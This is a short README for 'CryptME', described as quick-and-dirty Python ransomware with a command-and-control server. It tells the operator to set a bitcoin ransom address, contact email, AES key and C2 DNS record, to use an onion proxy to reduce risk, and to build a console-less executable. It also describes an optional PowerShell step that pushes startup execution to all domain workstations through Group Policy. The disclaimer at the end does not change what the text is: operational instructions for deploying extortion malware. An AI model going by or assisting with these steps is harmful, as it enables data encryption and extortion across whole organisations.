# CME
CryptME quick and dirty ransomware in python with a C2 Server, currently a work in progress and untested. 
Apache/Nginx with PHP support.

Adjust main.py and C2 with bitcoin address, contact email, AES key, and DNS A record to reach server. (Try and use an onion proxy to minimize risk) Then build setup.py with py2exe.

(Recommended to use the params setup(windows=['main.py'], options={"py2exe":{"includes":["sip"]}}) for no console window)

By default the single line Powershell script is disabled. Enable to add a GPO policy on a DC for all domain bound workstations for startup execution. (An XML file will be needed; create a gpo folder in the cloned repo with the group policy xml exported. Ensure its named 'gpreport.xml') 

## I am not responsible for any actions taken with this script. 
